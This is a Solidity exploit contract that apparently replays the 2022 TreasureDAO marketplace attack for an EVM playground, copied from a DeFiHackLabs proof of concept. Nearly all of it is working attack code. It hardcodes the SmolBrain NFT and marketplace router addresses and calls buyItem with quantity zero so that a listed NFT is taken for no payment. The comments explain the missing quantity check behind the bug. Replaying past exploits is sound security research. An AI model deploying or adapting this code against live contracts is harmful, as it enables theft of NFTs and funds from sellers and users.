// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-TreasureDAO).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry ContractTest
// (it implements onERC721Received and calls the router directly), so there is
// no standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit body + onERC721Received) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/TreasureDAO_exp.sol.
//
// Root cause: the public buy router TreasureMarketplaceBuyer computes payment
// as `totalPrice = _pricePerItem * _quantity` with NO `_quantity > 0` floor,
// while the inner TreasureMarketplace moves a full ERC721 token regardless of
// `_quantity`. Passing `_quantity = 0` yields zero MAGIC payment but a valid
// sale, so a listed NFT (SmolBrain #3557, listed at 6,969 MAGIC) is bought for
// 0 MAGIC and forwarded to the caller.

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
}

interface ITreasureMarketplaceBuyer {
    function buyItem(
        address _nftAddress,
        uint256 _tokenId,
        address _owner,
        uint256 _quantity,
        uint256 _pricePerItem
    ) external;
}

contract TreasureDAODrain {
    address constant SMOL_BRAIN = 0x6325439389E0797Ab35752B4F43a14C004f22A9c;
    address constant BUYER = 0x812cdA2181ed7c45a35a691E0C85E231D218E273;

    // SmolBrain #3557 — an arbitrary listed token; the bug is token-agnostic.
    uint256 constant TOKEN_ID = 3557;
    // Exactly the listing's stored unit price (6,969 MAGIC, 18 decimals), so the
    // router's `require(pricePerItem == _pricePerItem)` slippage check passes.
    // The attacker lies about QUANTITY, not price.
    uint256 constant PRICE_PER_ITEM = 6_969_000_000_000_000_000_000;

    function run() external {
        // Read the live owner of #3557 (the seller the listing is keyed under).
        address owner = IERC721(SMOL_BRAIN).ownerOf(TOKEN_ID);
        // Buy the whole NFT for 0 MAGIC: totalPrice = 6969e18 * 0 = 0.
        ITreasureMarketplaceBuyer(BUYER).buyItem(SMOL_BRAIN, TOKEN_ID, owner, 0, PRICE_PER_ITEM);
    }

    // The router forwards the NFT to msg.sender via safeTransferFrom, so the
    // receiver must implement onERC721Received (the router is itself an
    // ERC721Holder for the intermediate hop through the marketplace).
    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
